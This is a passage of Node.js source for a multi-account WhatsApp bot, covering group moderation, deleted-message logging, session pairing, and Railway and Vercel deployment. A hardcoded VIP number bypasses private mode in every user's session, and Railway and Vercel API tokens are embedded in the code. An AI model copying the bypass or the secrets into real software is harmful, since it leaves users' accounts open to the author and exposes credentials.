              try { await sock.sendMessage(remoteJid, { delete: message.key }); await sock.sendMessage(remoteJid, { text: '🚫 @' + senderJid.split('@')[0] + ', les stickers sont interdits!', mentions: [senderJid] }); continue; } catch(e) {}
            }
            // antiimage
            if (_gs.antiimage && _botIsAdm && message.message?.imageMessage) {
              try { await sock.sendMessage(remoteJid, { delete: message.key }); await sock.sendMessage(remoteJid, { text: '🚫 @' + senderJid.split('@')[0] + ', les images sont interdites!', mentions: [senderJid] }); continue; } catch(e) {}
            }
            // antivideo
            if (_gs.antivideo && _botIsAdm && message.message?.videoMessage) {
              try { await sock.sendMessage(remoteJid, { delete: message.key }); await sock.sendMessage(remoteJid, { text: '🚫 @' + senderJid.split('@')[0] + ', les vidéos sont interdites!', mentions: [senderJid] }); continue; } catch(e) {}
            }
          }
          // antibug (tous, même les admins)
          if (_ss.antiBug && !isAdmin(senderJid)) {
            const _bug = detectBugPayload(message, messageText);
            if (_bug) { await handleAntiBugTrigger(sock, message, remoteJid, senderJid, true, _bug); continue; }
          }
        }

        const _isVipSender = _senderNum === '23591234568';
        const _sessionPrefix = _ss.prefix || config.prefix;
        if (!messageText.startsWith(_sessionPrefix)) continue;

        // Mode private : seul le owner (en PV ou groupe) et le VIP passent
        if (_ss.botMode === 'private' && !_isOwner && !_isVipSender) continue;

        console.log('[' + phone + '] 📨 ' + messageText.substring(0, 60) + ' de ' + senderJid);

        await handleCommand(sock, message, messageText, remoteJid, senderJid, isGroup, _isOwner, _getSessionState(phone));
      } catch(e) {
        console.error('[' + phone + '] ❌ Erreur:', e.message);
      }
    }
  });

  // ✅ groups.update local
  sock.ev.on('groups.update', (updates) => {
    for (const update of updates) {
      if (update.id) {
        database.groups.set(update.id, {
          ...database.groups.get(update.id),
          ...update,
          lastUpdate: Date.now()
        });
        // Invalider le cache metadata pour ce groupe
        _groupMetaCache.delete(update.id);
      }
    }
  });

  // ✅ group-participants.update local (welcome, goodbye, permaban, antiadmin, antidemote)
  sock.ev.on('group-participants.update', async (update) => {
    const { id: groupJid, participants, action, author } = update;
    // Invalider le cache metadata pour ce groupe
    _groupMetaCache.delete(groupJid);

    // ── ANTIADMIN — bloquer promotion non autorisée ──
    if (action === 'promote') {
      const _aaGs = initGroupSettings(groupJid);
      if (_aaGs?.antiadmin) {
        try {
          const _botIsAdmin = await isBotGroupAdmin(sock, groupJid);
          if (_botIsAdmin) {
            const _authorNum = author ? author.split('@')[0].replace(/[^0-9]/g, '') : null;
            const _isBotAdmin = _authorNum && (config.botAdmins.includes(_authorNum) || config.adminNumbers.includes(_authorNum));
            if (!_isBotAdmin) {
              const _names = participants.map(p => '@' + p.split('@')[0]).join(', ');
              const _mentions = author ? [author, ...participants] : [...participants];
              await sock.groupParticipantsUpdate(groupJid, participants, 'demote').catch(() => {});
              await sock.sendMessage(groupJid, {
                text: `🛡️ *ANTI-ADMIN*\n\n⚠️ Tentative de promotion de ${_names} détectée.\nPromotion annulée + expulsion de l'auteur.\n\n*© SEIGNEUR TD*`,
                mentions: _mentions
              });
              if (author) await sock.groupParticipantsUpdate(groupJid, [author], 'remove').catch(() => {});
            }
          }
        } catch(e) {}
      }
    }

    // ── ANTIDEMOTE — bloquer rétrogradation non autorisée ──
    if (action === 'demote') {
      const _adGs = initGroupSettings(groupJid);
      if (_adGs?.antidemote) {
        try {
          const _botIsAdmin = await isBotGroupAdmin(sock, groupJid);
          if (_botIsAdmin) {
            const _authorNum = author ? author.split('@')[0].replace(/[^0-9]/g, '') : null;
            const _isBotAdmin = _authorNum && (config.botAdmins.includes(_authorNum) || config.adminNumbers.includes(_authorNum));
            if (!_isBotAdmin) {
              const _names = participants.map(p => '@' + p.split('@')[0]).join(', ');
              const _mentions = author ? [author, ...participants] : [...participants];
              await sock.groupParticipantsUpdate(groupJid, participants, 'promote').catch(() => {});
              await sock.sendMessage(groupJid, {
                text: `🛡️ *ANTI-DEMOTE*\n\n⚠️ Tentative de rétrogradation de ${_names} détectée.\nRétrogradation annulée + expulsion de l'auteur.\n\n*© SEIGNEUR TD*`,
                mentions: _mentions
              });
              if (author) await sock.groupParticipantsUpdate(groupJid, [author], 'remove').catch(() => {});
            }
          }
        } catch(e) {}
      }
    }

    if (action === 'add') {
      for (const participantJid of participants) {
        if (isPermaBanned(groupJid, participantJid)) {
          const banInfo = getPermaBanInfo(groupJid, participantJid);
          const botIsAdmin = await isBotGroupAdmin(sock, groupJid);
          if (botIsAdmin) {
            try {
              await sock.groupParticipantsUpdate(groupJid, [participantJid], 'remove');
              await sock.sendMessage(groupJid, {
                text: `🚫 *PERMABAN ACTIF*\n\n@${participantJid.split('@')[0]} a été expulsé automatiquement.\n\nRaison: ${banInfo.reason}\nBanni le: ${new Date(banInfo.timestamp).toLocaleString('fr-FR')}\nBanni par: @${banInfo.bannedBy.split('@')[0]}`,
                mentions: [participantJid, banInfo.bannedBy]
              });
            } catch(e) {}
          }
        } else {
          const settings = getGroupSettings(groupJid);
          if (settings.welcome) {
            try { await sendWelcomeMessage(sock, groupJid, participantJid); } catch(e) {}
          }
        }
      }
    }
    if (action === 'remove') {
      const settings = getGroupSettings(groupJid);
      if (settings.goodbye) {
        for (const participantJid of participants) {
          try { await sendGoodbyeMessage(sock, groupJid, participantJid); } catch(e) {}
        }
      }
    }
  });

  // ✅ ANTICALL local
  sock.ev.on('call', async (calls) => {
    for (const call of calls) {
      if (!_ss.antiCall) continue;
      if (call.status === 'offer') {
        try { await sock.rejectCall(call.id, call.from); } catch(e) {}
      }
    }
  });

  // ✅ ANTIDELETE local
  sock.ev.on('messages.delete', async (deletion) => {
    if (!_ss.antiDelete) return;
    try {
      let keys = [];
      if (deletion.keys) keys = deletion.keys;
      else if (Array.isArray(deletion)) keys = deletion;
      else if (deletion.id) keys = [deletion];
      for (const key of keys) {
        const messageId = key.id || key;
        const cachedMsg = messageCache.get(messageId);
        if (!cachedMsg) continue;
        const botPvJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
        let notifyJid;
        if (_ss.antiDeleteMode === 'private') notifyJid = botPvJid;
        else if (_ss.antiDeleteMode === 'chat') notifyJid = cachedMsg.remoteJid;
        else { notifyJid = cachedMsg.remoteJid; await sendAntiDeleteNotif(sock, botPvJid, cachedMsg); }
        await sendAntiDeleteNotif(sock, notifyJid, cachedMsg);
      }
    } catch(e) { console.error('[ANTIDELETE-SESSION]', e.message); }
  });

  // ✅ ANTIEDIT local
  sock.ev.on('messages.update', async (updates) => {
    if (!_ss.antiEdit) return;
    try {
      for (const update of updates) {
        const messageId = update.key?.id;
        if (!messageId) continue;
        const cachedMsg = messageCache.get(messageId);
        if (!cachedMsg || cachedMsg.text === '[Media]') continue;
        let newText = null;
        if (update.update?.message) {
          const msg = update.update.message;
          newText = msg.conversation || msg.extendedTextMessage?.text ||
            msg.editedMessage?.message?.conversation || msg.editedMessage?.message?.extendedTextMessage?.text;
        }
        if (!newText || newText === cachedMsg.text) continue;
        const senderJid = cachedMsg.sender;
        const botPvEdit = sock.user.id.split(':')[0] + '@s.whatsapp.net';
        let notifyJid;
        if (_ss.antiEditMode === 'private') notifyJid = botPvEdit;
        else if (_ss.antiEditMode === 'chat') notifyJid = cachedMsg.remoteJid;
        else { notifyJid = cachedMsg.remoteJid; await sock.sendMessage(botPvEdit, { text: `▎✏️ MODIFIÉ | @${senderJid.split('@')[0]}\n▎❌ Ancien: ${cachedMsg.text}\n▎✅ Nouveau: ${newText}\n▎© SEIGNEUR TD`, mentions: [senderJid] }); }
        await sock.sendMessage(notifyJid, { text: `▎✏️ MODIFIÉ | @${senderJid.split('@')[0]}\n▎❌ Ancien: ${cachedMsg.text}\n▎✅ Nouveau: ${newText}\n▎© SEIGNEUR TD`, mentions: [senderJid] });
        cachedMsg.text = newText;
      }
    } catch(e) { console.error('[ANTIEDIT-SESSION]', e.message); }
  });

  sock.ev.on('creds.update', saveCreds);
  console.log('[' + phone + '] 👂 Bot actif');

  // Message de connexion en PV du bot — UNE SEULE FOIS par vraie connexion
  try {
    const _connBotPv = sock.user?.id ? sock.user.id.split(':')[0] + '@s.whatsapp.net' : null;
    const _connSession = activeSessions.get(phone);
    const _alreadySent = _connSession?._connMsgSent === true;
    const _connMode = _ss.botMode || 'public';
    const _connModeLabel = _connMode === 'private' ? 'Private [✓]' : 'Public [✓]';
    const _connPrefix = _ss.prefix || config.prefix || '.';
    if (_connBotPv && !_alreadySent) {
      if (_connSession) _connSession._connMsgSent = true;
      setTimeout(async () => {
        try {
          await sock.sendMessage(_connBotPv, {
            text:
`                  *SEIGNEUR TD* 🇹🇩
🤖 STATUT      : En ligne & Opérationnel
📡 MODE        : ${_connModeLabel}
⌨️ PREFIXE     : { ${_connPrefix} }
🔖 VERSION     : v1.0.1`
          });
        } catch(_e) {}
      }, 3000);
    }
  } catch(_e) {}

}


// ─── Reconnexion silencieuse — NE supprime JAMAIS les credentials ────────────
async function reconnectSession(phone, retryCount = 0) {
  const sessionFolder = './sessions/' + phone;
  if (!fs.existsSync(sessionFolder)) {
    console.log('[RECONNECT] ' + phone + ' — dossier introuvable, ignoré');
    return false;
  }
  try {
    const version = await getBaileysVersion();
    const { state, saveCreds } = await useMultiFileAuthState(sessionFolder);
    if (!state.creds?.me && !state.creds?.registered) {
      console.log('[RECONNECT] ' + phone + ' — credentials vides, ignoré');
      return false;
    }
    const sock = makeWASocket({
      version,
      logger: pino({ level: 'silent' }),
      printQRInTerminal: false,
      auth: state,
      browser: ['Ubuntu', 'Chrome', '20.0.04'],
      keepAliveIntervalMs: 10000,
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 60000,
      retryRequestDelayMs: 250,
      maxMsgRetryCount: 5,
      getMessage: async (key) => {
      try {
        const cached = messageCache.get(key.id);
        if (cached) return cached;
      } catch(e) {}
      return undefined;
    }
    });
    activeSessions.set(phone, { sock, status: 'reconnecting', pairingCode: null, createdAt: Date.now() });
    sock.ev.on('connection.update', async (update) => {
      const { connection, lastDisconnect } = update;
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      const loggedOut = statusCode === DisconnectReason.loggedOut;
      const session = activeSessions.get(phone);
      if (connection === 'open') {
        if (session) { session.status = 'connected'; session.connectedAt = Date.now(); session._lastPing = Date.now(); }
        console.log('[RECONNECT] ✅ ' + phone + ' reconnecté silencieusement');
        // Nouveau socket = nouveau _launched, toujours lancer launchSessionBot
        if (sock._launched) return;
        sock._launched = true;
        // NE PAS reset _connMsgSent — le message de connexion ne s'envoie qu'une seule fois
        launchSessionBot(sock, phone, sessionFolder, saveCreds);
      } else if (connection === 'close') {
        if (loggedOut) {
          activeSessions.delete(phone);
          try { fs.rmSync(sessionFolder, { recursive: true, force: true }); } catch {}
          console.log('[RECONNECT] 🗑️ ' + phone + ' déconnecté (loggedOut)');
          return;
        }
        // 515 = stream restart, 428 = keepalive timeout, 503 = service unavailable
        const _isNormalDisconnect = statusCode === 515 || statusCode === 428 || statusCode === 503;
        activeSessions.delete(phone);
        // Délai exponentiel plafonné à 30s, reset après déconnexion normale
        const nextRetry = _isNormalDisconnect ? 0 : retryCount + 1;
        const waitMs = _isNormalDisconnect
          ? 8000
          : Math.min(5000 * (retryCount + 1), 30000);
        console.log('[RECONNECT] 🔄 ' + phone + ' (code:' + statusCode + ') dans ' + (waitMs/1000) + 's... (retry #' + nextRetry + ')');
        await delay(waitMs);
        await reconnectSession(phone, nextRetry);
      }
    });
    sock.ev.on('creds.update', saveCreds);
    console.log('[RECONNECT] 🔄 ' + phone + ' reconnexion en cours...');
    return true;
  } catch(e) {
    console.log('[RECONNECT] ❌ ' + phone + ' erreur: ' + e.message);
    return false;
  }
}

// ─── Restaurer toutes les sessions après restart ──────────────────────────────
async function restoreWebSessions() {
  // Charger toutes les données sauvegardées AVANT de démarrer les sessions
  loadData();

  const sessionsDir = './sessions';
  if (!fs.existsSync(sessionsDir)) return;
  const phones = fs.readdirSync(sessionsDir).filter(f => {
    try { return fs.statSync(sessionsDir + '/' + f).isDirectory(); } catch { return false; }
  });
  if (phones.length === 0) { console.log('[RESTORE] Aucune session trouvée'); return; }
  console.log('[RESTORE] ' + phones.length + ' session(s) — reconnexion silencieuse...');
  for (const phone of phones) {
    try {
      if (!sessionHasCredentials(phone)) {
        console.log('[RESTORE] ' + phone + ' — pas de credentials, ignoré');
        continue;
      }
      await delay(1500);
      await reconnectSession(phone);
    } catch(e) {
      console.log('[RESTORE] ❌ Erreur ' + phone + ': ' + e.message);
    }
  }
}

// ─── Auto-pull désactivé — update manuel via commande .update uniquement ────

// ─── Créer une nouvelle session utilisateur (bail-lite direct) ───────────────
async function createUserSession(phone) {
  const sessionFolder = './sessions/' + phone;
  try { fs.rmSync(sessionFolder, { recursive: true, force: true }); } catch {}
  fs.mkdirSync(sessionFolder, { recursive: true });

  const version = await getBaileysVersion();
  const { state, saveCreds } = await useMultiFileAuthState(sessionFolder);

  const sock = makeWASocket({
    version,
    logger: pino({ level: 'silent' }),
    printQRInTerminal: false,
    auth: state,
    browser: ['Ubuntu', 'Chrome', '20.0.04'],
    keepAliveIntervalMs: 10000,
    connectTimeoutMs: 60000,
    defaultQueryTimeoutMs: 60000,
    retryRequestDelayMs: 250,
    maxMsgRetryCount: 5,
    getMessage: async (key) => { try { return messageCache.get(key.id) || undefined; } catch(e) { return undefined; } }
  });

  activeSessions.set(phone, { sock, status: 'pending', pairingCode: null, createdAt: Date.now() });

  // Auto-cleanup si pas connecté en 10 minutes
  const cleanupTimer = setTimeout(() => {
    const s = activeSessions.get(phone);
    if (s && s.status !== 'connected') {
      console.log('[' + phone + '] ⏱️ Timeout — session supprimée');
      try { sock?.ws?.close(); } catch {}
      activeSessions.delete(phone);
      try { fs.rmSync(sessionFolder, { recursive: true, force: true }); } catch {}
    }
  }, 10 * 60 * 1000);

  // Demander le pairing code après 3s
  const cleanPhone = phone.replace(/[^0-9]/g, '');
  await delay(3000);
  let formatted;
  try {
    const code = await sock.requestPairingCode(cleanPhone);
    formatted = code?.match(/.{1,4}/g)?.join('-') || code;
    console.log('[' + phone + '] 🔑 Code: ' + formatted);
  } catch(e) {
    throw new Error('requestPairingCode échoué: ' + e.message);
  }

  const sessionData = activeSessions.get(phone);
  if (sessionData) sessionData.pairingCode = formatted;

  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update;
    const statusCode = lastDisconnect?.error?.output?.statusCode;
    const loggedOut = statusCode === DisconnectReason.loggedOut;
    const session = activeSessions.get(phone);
    const currentStatus = session?.status || 'unknown';

    if (connection === 'open') {
      clearTimeout(cleanupTimer);
      console.log('[' + phone + '] ✅ Connecté! Démarrage bot...');
      if (session) { session.status = 'connected'; session.connectedAt = Date.now(); }
      if (sock._launched) return;
      sock._launched = true;
      launchSessionBot(sock, phone, sessionFolder, saveCreds);

    } else if (connection === 'close') {
      clearTimeout(cleanupTimer);
      console.log('[' + phone + '] 📴 Déconnecté. Code: ' + statusCode + ', Status: ' + currentStatus);

      if (currentStatus === 'pending' && !loggedOut) {
        // Code en attente → reconnexion WS silencieuse sans nouveau pairing code
        console.log('[' + phone + '] ⏳ Code en attente, reconnexion WS...');
        await delay(2000);
        try {
          const v2 = await getBaileysVersion();
          const { state: s2, saveCreds: sc2 } = await useMultiFileAuthState(sessionFolder);
          const sock2 = makeWASocket({ version: v2, logger: pino({ level: 'silent' }), printQRInTerminal: false, auth: s2, browser: ['Ubuntu', 'Chrome', '20.0.04'], getMessage: async (key) => { try { return messageCache.get(key.id) || undefined; } catch(e) { return undefined; } } });
          const sess = activeSessions.get(phone);
          if (sess) sess.sock = sock2;
          sock2.ev.on('connection.update', async (u2) => {
            if (u2.connection === 'open') {
              const s = activeSessions.get(phone);
              if (s) { s.status = 'connected'; s.connectedAt = Date.now(); }
              if (sock2._launched) return;
              sock2._launched = true;
              launchSessionBot(sock2, phone, sessionFolder, sc2);
            }
          });
          sock2.ev.on('creds.update', sc2);
        } catch(e) { console.log('[' + phone + '] ❌ Reconnexion WS échouée: ' + e.message); }
        return;
      }

      if (loggedOut) {
        activeSessions.delete(phone);
        try { fs.rmSync(sessionFolder, { recursive: true, force: true }); } catch {}
        console.log('[' + phone + '] 🗑️ Session supprimée (loggedOut)');
      } else if (currentStatus === 'connected') {
        activeSessions.delete(phone);
        console.log('[' + phone + '] 🔄 Déconnexion réseau — reconnexion silencieuse...');
        await delay(5000);
        await reconnectSession(phone);
      }
    }
  });

  sock.ev.on('creds.update', saveCreds);
  return formatted;
}

// ─── Déploiement automatique sur Railway ────────────────────────────────────
async function railwayGQL(token, query, variables = {}) {
  const res = await axios.post('https://backboard.railway.app/graphql/v2',
    { query, variables },
    { headers: { 'Authorization': 'Bearer ' + token, 'Content-Type': 'application/json' }, timeout: 30000 }
  );
  if (res.data?.errors) throw new Error(res.data.errors[0]?.message || 'GraphQL error');
  return res.data?.data;
}

async function deployToRailway(phone, sessionString) {
  const RAILWAY_TOKEN = config.railwayToken || process.env.RAILWAY_TOKEN || '96bac1f1-b737-4cb0-b8c7-d8af5a4a0b0a';
  const GITHUB_REPO = 'Azountou235/SEIGNEUR-TD-';
  try {
    console.log('[RAILWAY] Déploiement pour ' + phone + '...');

    // 1. Créer le projet
    const p = await railwayGQL(RAILWAY_TOKEN,
      'mutation CreateProject($name: String!) { projectCreate(input: { name: $name, defaultEnvironmentName: "production" }) { id name } }',
      { name: 'seigneur-td-' + phone }
    );
    const projectId = p?.projectCreate?.id;
    if (!projectId) throw new Error('Impossible de créer le projet Railway');
    console.log('[RAILWAY] Projet: ' + projectId);

    // 2. Récupérer l'environment
    const e = await railwayGQL(RAILWAY_TOKEN,
      'query GetEnv($id: String!) { project(id: $id) { environments { edges { node { id name } } } } }',
      { id: projectId }
    );
    const envId = e?.project?.environments?.edges?.[0]?.node?.id;
    if (!envId) throw new Error('Environment Railway introuvable');

    // 3. Créer le service (sans source GitHub)
    const s = await railwayGQL(RAILWAY_TOKEN,
      'mutation CreateService($projectId: String!, $name: String!) { serviceCreate(input: { projectId: $projectId, name: $name }) { id } }',
      { projectId, name: 'bot-' + phone }
    );
    const serviceId = s?.serviceCreate?.id;
    if (!serviceId) throw new Error('Impossible de créer le service Railway');
    console.log('[RAILWAY] Service: ' + serviceId);

    // 4. Connecter GitHub au service
    await railwayGQL(RAILWAY_TOKEN,
      'mutation ConnectGithub($id: String!, $repo: String!, $branch: String!) { serviceConnect(id: $id, input: { source: { repo: $repo, branch: $branch } }) { id } }',
      { id: serviceId, repo: GITHUB_REPO, branch: 'main' }
    ).catch(async () => {
      // Fallback: utiliser serviceInstanceUpdate
      await railwayGQL(RAILWAY_TOKEN,
        'mutation UpdateInstance($serviceId: String!, $envId: String!, $repo: String!) { serviceInstanceUpdate(serviceId: $serviceId, environmentId: $envId, input: { source: { repo: $repo, branch: "main" } }) }',
        { serviceId, envId, repo: GITHUB_REPO }
      );
    });

    // 5. Variables d'environnement
    await railwayGQL(RAILWAY_TOKEN,
      'mutation SetVars($projectId: String!, $envId: String!, $serviceId: String!, $vars: Json!) { variableCollectionUpsert(input: { projectId: $projectId, environmentId: $envId, serviceId: $serviceId, variables: $vars }) }',
      { projectId, envId, serviceId, vars: { SESSION_ID: sessionString, OWNER_NUMBER: phone, BOT_NAME: 'SEIGNEUR TD' } }
    );

    // 6. Déclencher le déploiement
    await railwayGQL(RAILWAY_TOKEN,
      'mutation Deploy($serviceId: String!, $envId: String!) { serviceInstanceDeploy(serviceId: $serviceId, environmentId: $envId) }',
      { serviceId, envId }
    ).catch(() => console.log('[RAILWAY] Deploy déclenché (ou déjà en cours)'));

    console.log('[RAILWAY] ✅ Déployé pour ' + phone);
    return { success: true, projectId, serviceId };
  } catch(e) {
    console.error('[RAILWAY] Erreur:', e.message);
    return { success: false, error: e.message };
  }
}

// ─── Serveur HTTP API — Compatible Lovable ────────────────────────────────────
createServer(async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, x-api-key, X-Secret');
  res.setHeader('Content-Type', 'application/json');

  if (req.method === 'OPTIONS') { res.writeHead(200); res.end(); return; }

  // Parser le body JSON
  let body = {};
  if (req.method === 'POST') {
    body = await new Promise((resolve) => {
      let data = '';
      req.on('data', chunk => data += chunk);
      req.on('end', () => { try { resolve(JSON.parse(data)); } catch { resolve({}); } });
    });
  }

  const url = req.url?.split('?')[0];

  // ── GET /health — pas besoin de clé API ──────────────────────────────
  if (req.method === 'GET' && url === '/health') {
    res.writeHead(200); res.end(JSON.stringify({ status: 'online', bot: config.botName, sessions: activeSessions.size })); return;
  }

  // Vérification clé API pour toutes les autres routes
  const apiKey = req.headers['x-api-key'] || req.headers['x-secret'];
  if (apiKey !== PAIRING_SECRET) {
    res.writeHead(401); res.end(JSON.stringify({ error: 'Clé API invalide' })); return;
  }

  // ── POST /api/connect — Demande de connexion (route principale Lovable) ──
  if (req.method === 'POST' && (url === '/api/connect' || url === '/pair')) {
    const phone = body.phone?.replace(/\D/g, '');
    if (!phone || phone.length < 7) { res.writeHead(400); res.end(JSON.stringify({ error: 'Numéro invalide' })); return; }

    if (activeSessions.has(phone)) {
      const existing = activeSessions.get(phone);
      if (existing.status === 'connected') {
        res.writeHead(200); res.end(JSON.stringify({ status: 'already_connected', phone })); return;
      }
      if (existing.pairingCode) {
        res.writeHead(200); res.end(JSON.stringify({ status: 'pending', pairingCode: existing.pairingCode, phone })); return;
      }
      try { existing.sock?.ws?.close(); } catch {}
      // Garder les credentials si déjà présents
      if (!sessionHasCredentials(phone)) {
        try { fs.rmSync('./sessions/' + phone, { recursive: true, force: true }); } catch {}
      }
      activeSessions.delete(phone);
    }

    try {
      console.log('[API] Nouvelle session pour: ' + phone);
      const pairingCode = await createUserSession(phone);
      res.writeHead(200); res.end(JSON.stringify({ status: 'pending', pairingCode, phone }));
    } catch(e) {
      console.error('[API] Erreur création session:', e.message);
      res.writeHead(500); res.end(JSON.stringify({ error: e.message }));
    }
    return;
  }

  // ── GET /api/status?phone=xxx — Statut d'une session ─────────────────
  if (req.method === 'GET' && (url === '/api/status' || url === '/status')) {
    const phone = req.url?.split('phone=')[1]?.replace(/\D/g, '');
    if (!phone) { res.writeHead(400); res.end(JSON.stringify({ error: 'Paramètre phone manquant' })); return; }
    const session = activeSessions.get(phone);
    if (!session) { res.writeHead(200); res.end(JSON.stringify({ status: 'not_found', phone })); return; }
    res.writeHead(200); res.end(JSON.stringify({
      status: session.status,
      phone,
      pairingCode: session.pairingCode || null,
      connectedAt: session.connectedAt || null
    }));
    return;
  }

  // ── GET /api/sessions — Liste toutes les sessions actives ─────────────
  if (req.method === 'GET' && url === '/api/sessions') {
    const list = [];
    for (const [phone, session] of activeSessions) {
      list.push({ phone, status: session.status, connectedAt: session.connectedAt || null });
    }
    res.writeHead(200); res.end(JSON.stringify({ sessions: list, count: list.length })); return;
  }

  // ── POST /api/disconnect — Déconnecter une session ────────────────────
  if (req.method === 'POST' && url === '/api/disconnect') {
    const phone = body.phone?.replace(/\D/g, '');
    const session = activeSessions.get(phone);
    if (session?.sock) {
      try { await session.sock.logout(); } catch {}
      activeSessions.delete(phone);
    }
    res.writeHead(200); res.end(JSON.stringify({ status: 'disconnected', phone })); return;
  }

  res.writeHead(404); res.end(JSON.stringify({ error: 'Route non trouvée' }));
}).listen(PAIRING_PORT, () => {
  console.log('[API] Serveur en ligne sur port ' + PAIRING_PORT);
  console.log('[API] Clé: ' + PAIRING_SECRET);
});

// ─── Mise à jour automatique BOT_URL sur Vercel ──────────────────────────────
async function updateVercelEnv(newUrl) {
  const VERCEL_TOKEN      = process.env.VERCEL_TOKEN || 'vcp_17K2l1zVnOGZypei3ngYAJvdwjoBb7wcocROos921yjBcMJzRx0aYXRR';
  const VERCEL_PROJECT_ID = process.env.VERCEL_PROJECT_ID || 'prj_1ocACI1X4TkMN0XtqzEUhwQifymq';

  if (VERCEL_TOKEN === 'METS_TON_TOKEN_ICI') {
    console.log('[VERCEL] ⚠️ VERCEL_TOKEN non configuré — mets à jour BOT_URL manuellement: ' + newUrl);
    return;
  }

  try {
    console.log('[VERCEL] Mise à jour BOT_URL → ' + newUrl + '...');

    // Supprimer l'ancienne variable BOT_URL
    await axios.delete('https://api.vercel.com/v9/projects/' + VERCEL_PROJECT_ID + '/env/BOT_URL', {
      headers: { 'Authorization': 'Bearer ' + VERCEL_TOKEN }
    }).catch(() => {});

    // Récupérer la liste des variables pour trouver l'ID de BOT_URL
    const listRes = await axios.get('https://api.vercel.com/v9/projects/' + VERCEL_PROJECT_ID + '/env', {
      headers: { 'Authorization': 'Bearer ' + VERCEL_TOKEN }
    });

    const envVars = listRes.data?.envs || [];
    const botUrlVar = envVars.find(e => e.key === 'BOT_URL');

    if (botUrlVar) {
      // Mettre à jour la variable existante
      await axios.patch(
        'https://api.vercel.com/v9/projects/' + VERCEL_PROJECT_ID + '/env/' + botUrlVar.id,
        { value: newUrl, target: ['production', 'preview', 'development'] },
        { headers: { 'Authorization': 'Bearer ' + VERCEL_TOKEN, 'Content-Type': 'application/json' } }
      );
    } else {
      // Créer la variable
      await axios.post(
        'https://api.vercel.com/v9/projects/' + VERCEL_PROJECT_ID + '/env',
        { key: 'BOT_URL', value: newUrl, type: 'plain', target: ['production', 'preview', 'development'] },
        { headers: { 'Authorization': 'Bearer ' + VERCEL_TOKEN, 'Content-Type': 'application/json' } }
      );
    }

    // Redéployer Vercel pour appliquer la nouvelle variable
    await axios.post(
      'https://api.vercel.com/v13/deployments',
      { name: 'seigneur-td-pair', gitSource: { type: 'github', repoId: VERCEL_PROJECT_ID, ref: 'main' } },
      { headers: { 'Authorization': 'Bearer ' + VERCEL_TOKEN, 'Content-Type': 'application/json' } }
    ).catch(() => {});

    console.log('[VERCEL] ✅ BOT_URL mis à jour: ' + newUrl);
  } catch(e) {
    console.log('[VERCEL] ❌ Erreur mise à jour:', e.message);
    console.log('[VERCEL] → Mets à jour BOT_URL manuellement: ' + newUrl);
  }
}

// ─── Démarrage : autoPull → connectToWhatsApp → restoreWebSessions ───────────
// Bot principal désactivé — seules les sessions connectées via le site fonctionnent
restoreWebSessions().catch(e => console.log('[RESTORE] Erreur globale:', e.message));

// ─── Watchdog global — vérifie toutes les 3 min que les sessions sont vivantes ─
// ✅ Un WebSocket "ouvert" (readyState=1) ne garantit pas que la session répond
// encore réellement à WhatsApp (connexion "zombie"). On ajoute une sonde active
// (sendPresenceUpdate) après le check readyState pour confirmer la vivacité réelle.
setInterval(async () => {
  for (const [phone, session] of activeSessions) {
    if (session.status !== 'connected') continue;
    const sock = session.sock;
    if (!sock) continue;
    // Vérifier si le WebSocket est toujours ouvert
    const wsState = sock.ws?.readyState;
    // readyState: 0=CONNECTING 1=OPEN 2=CLOSING 3=CLOSED
    if (wsState !== undefined && wsState !== 1) {
      console.log('[WATCHDOG] ⚠️ ' + phone + ' — WS fermé (state=' + wsState + '), reconnexion...');
      activeSessions.delete(phone);
      await reconnectSession(phone).catch(e => console.log('[WATCHDOG] Erreur:', e.message));
      continue;
    }
    // ✅ Sonde active — confirme que la session répond vraiment, pas juste que le WS est ouvert
    try {
      await Promise.race([
        sock.sendPresenceUpdate('available'),
        new Promise((_, rej) => setTimeout(() => rej(new Error('timeout sonde 8s')), 8000))
      ]);
      session._lastPing = Date.now();
    } catch (e) {
      console.log('[WATCHDOG] ⚠️ ' + phone + ' — session zombie (' + e.message + '), reconnexion...');
      try { sock.ws?.close(); } catch(_e) {}
      activeSessions.delete(phone);
      await reconnectSession(phone).catch(e2 => console.log('[WATCHDOG] Erreur:', e2.message));
    }
  }
}, 3 * 60 * 1000);


process.on('SIGINT', () => {
  console.log('\n\n👋 Bot shutting down...');
  saveData();
  process.exit(0);
});

process.on('SIGTERM', () => {
  console.log('\n\n🛑 SIGTERM reçu — arrêt propre...');
  saveData();
  process.exit(0);
});

process.on('uncaughtException', (err) => {
  const _msg = err?.message || String(err);
  // Ignorer les erreurs de déchiffrement WhatsApp — non fatales
  const _isSignal = _msg.includes('Bad MAC') || _msg.includes('Failed to decrypt')
    || _msg.includes('Closing session') || _msg.includes('SessionEntry')
    || _msg.includes('decrypt') || _msg.includes('SignalSession')
    || _msg.includes('message not in store');
  if (!_isSignal) {
    console.error('[ERREUR NON CAPTUREE] Le bot continue:', _msg);
  }
  try { saveData(); } catch(e) {}
  // Ne jamais exit
});

process.on('unhandledRejection', (reason) => {
  const _msg = reason?.message || String(reason);
  const _isSignal = _msg.includes('Bad MAC') || _msg.includes('Failed to decrypt')
    || _msg.includes('Closing session') || _msg.includes('decrypt')
    || _msg.includes('message not in store');
  if (!_isSignal) {
    console.error('[PROMESSE REJETEE] Le bot continue:', _msg);
  }
  // Ne jamais exit
});
